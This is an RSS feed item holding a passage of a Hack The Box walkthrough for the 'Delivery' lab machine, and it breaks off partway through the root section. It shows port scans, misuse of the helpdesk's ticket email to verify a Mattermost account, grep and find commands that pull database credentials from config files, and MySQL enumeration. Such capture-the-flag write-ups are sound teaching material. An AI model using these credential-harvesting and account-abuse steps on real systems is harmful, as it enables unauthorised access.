<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Easy on 5ysk3y Pwnz</title>
    <link>https://5ysk3y.github.io/tags/easy/</link>
    <description>Recent content in Easy on 5ysk3y Pwnz</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 22 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/easy/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Delivery [Easy] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/delivery/</link>
      <pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/delivery/</guid>
      <description>Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Initial (top 1000) scan&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Mon Mar 15 12:24:00 2021 as: nmap -sC -sV -oA nmap/initial -vvv delivery.htb&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up, received reset ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
rDNS record &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222: delivery
Scanned at 2021-03-15 12:24:00 GMT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 9s
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp open  http    syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Mon Mar 15 12:24:09 2021 -- 1 IP address (1 host up) scanned in 9.25 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Full scan&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Mon Mar 15 12:33:07 2021 as: nmap -p- -oA nmap/full_port -vvv delivery.htb&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up, received echo-reply ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.022s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
rDNS record &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222: delivery
Scanned at 2021-03-15 12:33:07 GMT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 31s
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; closed ports
Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
80/tcp   open  http    syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
8065/tcp open  unknown syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;

Read data files from: /usr/bin/../share/nmap
&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Mon Mar 15 12:33:38 2021 -- 1 IP address (1 host up) scanned in 30.93 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The higher &lt;code&gt;8065&lt;/code&gt; port is actually another web port.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s begin by outlining the different websites that are available here along with a brief description for each:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://delivery.htb&#34;&gt;http://delivery.htb&lt;/a&gt; = Loads a static HTML website that has links to the following:&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://helpdesk.delivery.htb&#34;&gt;http://helpdesk.delivery.htb&lt;/a&gt; = osTicket (no version yet)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://delivery.htb:8065&#34;&gt;http://delivery.htb:8065&lt;/a&gt; = MatterMost (All team communication in one place, searchable and accessible anywhere)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now these can be looked into with more intent.&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;websites&#34;&gt;Websites&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://delivery.htb&#34;&gt;http://delivery.htb&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For the most part this is a static page with no interative elements that actually directs people to a helpdesk website. There is a button labelled &amp;ldquo;Contact Us&amp;rdquo; which also gives us some useful information:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210323125700.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;The MatterMost web server is on a higher port (8065)&lt;/p&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://helpdesk.delivery.htb&#34;&gt;http://helpdesk.delivery.htb&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On the helpdesk, it is possible to register for an account by virtue of submitting a new ticket. The above image seems to suggest we should register with a @delivery.htb e-mail,
and doing so creates a new ticket along with a message akin to the following message:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;You may check the status of your ticket, by navigating to the Check Status page using ticket id: 6066582.

If you want to add more information to your ticket, just email 6066582@delivery.htb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we then look to check the ticket using our chosen @delivery.htb email address and the generated ticket number, we get access to said ticket:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328221641.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;The interesting thing here is that, if you pay attention to the information given when we create our ticket, it specifically says that you can update the ticket directly by emailing a special address, in this case: &lt;a href=&#34;mailto:6066582@delivery.htb&#34;&gt;6066582@delivery.htb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This leads us onto Mattermost:&lt;/p&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://delivery.htb:8065/&#34;&gt;http://delivery.htb:8065/&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Registering on here, using just random information, shows that it requires email verification before you can proceed.&lt;/p&gt;
&lt;p&gt;Using an actual burner email demonstrates that we dont actually get anything from the server, which makes sense since HTB machines have very limited internet access (e.g. nothing outside of GitHub), however we can leverage our helpdesk ticket address in hope that it can intercept any verification e-mails on the ticket itself. First, register on Mattermost with the following information, relevant to the helpdesk ticket generated earlier. In my case:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;E-mail: &lt;a href=&#34;mailto:6066582@delivery.htb&#34;&gt;6066582@delivery.htb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;User: syskey&lt;/li&gt;
&lt;li&gt;Pass: Password123!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And then refresh the ticket in OSTicket to get the contents of the verification e-mail:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328221453.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;If you follow the URL that&amp;rsquo;s provided it will allow verification and a login to Mattermost can then be achieved.&lt;/p&gt;
&lt;p&gt;Once logged in, the first thing shown is a team selection screen:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328222236.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Joining the Internal team, as it&amp;rsquo;d be rude not to and it&amp;rsquo;s the only option, there&amp;rsquo;s get some interesting information along with a set of creds:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328222439.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Attempting to use these credentials via SSH gives us a user shell and the user.txt - from here, we TargetRoot.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;As shell access was gained via exploitation of communication between two web portals, the first thing to check would be Mattermost/OSTicket website files for potential database information. Inside of &lt;code&gt;/var/www&lt;/code&gt; there are files for the root webpage for delivery.htb as well as the OSTicket instance:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/var/www$ ls -la
total &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:09 .
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:08 ..
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 06:52 html
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; www-data www-data &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:10 osticket
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Starting with digging for DB information with OSTicket:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/var/www/osticket$ grep -ril mysql .
./upload/include/i18n/en_US/help/tips/install.yaml
./upload/include/ost-sampleconfig.php
./upload/include/class.search.php
./upload/include/cli/modules/import.php
./upload/include/staff/system.inc.php
./upload/include/ost-config.php
./upload/include/class.upgrader.php
./upload/include/class.setup.php
./upload/include/class.file.php
./upload/include/class.dynamic_forms.php
./upload/include/.MANIFEST
./upload/include/class.orm.php
./upload/include/class.misc.php
./upload/include/upgrader/prereq.inc.php
./upload/include/upgrader/streams/core/9143a511-0d6099a6.patch.sql
./upload/include/upgrader/streams/core/8f99b8bf-03ff59bf.task.php
./upload/include/upgrader/streams/core/f5692e24-4323a6a8.patch.sql
./upload/include/upgrader/streams/core/8b923d61-9b5550da.patch.sql
./upload/include/mysqli.php
./upload/include/class.timezone.php
./upload/bootstrap.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The standout file here is &lt;code&gt;./upload/include/ost-config.php&lt;/code&gt; - namely down to the filename, but also because there is a sample variant in this list, which indicates that this may well be an updated copy that&amp;rsquo;s being used by OSTicket. Looking at the file itself shows there are indeed some MySQL Creds:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Mysql Login info
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBTYPE&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBHOST&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBNAME&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;osticket&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBUSER&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ost_user&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBPASS&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!H3lpD3sk123!&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Logging into the MySQL service with those credentials means that digging can continue:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;MariaDB [(&lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;)]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; databases;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Database&lt;/span&gt;           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; information_schema &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; osticket           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rows&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;set&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;000&lt;/span&gt; sec)

MariaDB [(&lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;)]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; use osticket;
&lt;span style=&#34;color:#66d9ef&#34;&gt;Database&lt;/span&gt; changed

MariaDB [osticket]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; tables &lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; Tables_in_osticket &lt;span style=&#34;color:#66d9ef&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%user%&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; Tables_in_osticket &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user__cdata    &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user_account   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user_email     &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at each of these user tables, there don&amp;rsquo;t appear to be any useful hashes, which sucks, so the next step is to look at Mattermost to see if that has an associated DB:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:~$ find / -type d -name mattermost 2&amp;gt;/dev/null
/opt/mattermost
/var/lib/mysql/mattermost
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There &lt;em&gt;is&lt;/em&gt; a folder for Mattermost within MySQL&amp;rsquo;s directory structutre, which is a good sign. The file system contents are also somewhat interesting:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost$ ls -la
total &lt;span style=&#34;color:#ae81ff&#34;&gt;288&lt;/span&gt;
drwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:24 .
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root       root         &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:22 ..
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:53 bin
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:24 client
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:23 config
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 data
-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;2052&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 ENTERPRISE-EDITION-LICENSE.txt
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 fonts
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 i18n
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:23 logs
-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost    &lt;span style=&#34;color:#ae81ff&#34;&gt;898&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 manifest.txt
-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost &lt;span style=&#34;color:#ae81ff&#34;&gt;229264&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 NOTICE.txt
drwxr--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 plugins
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:53 prepackaged_plugins
-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;6262&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 README.md
drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 templates
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inside of the &lt;code&gt;config&lt;/code&gt; directory we have a &lt;code&gt;config.json&lt;/code&gt; file which does contain some more MySQL credentials, albeit not in the usual PHP format:&lt;/p&gt;
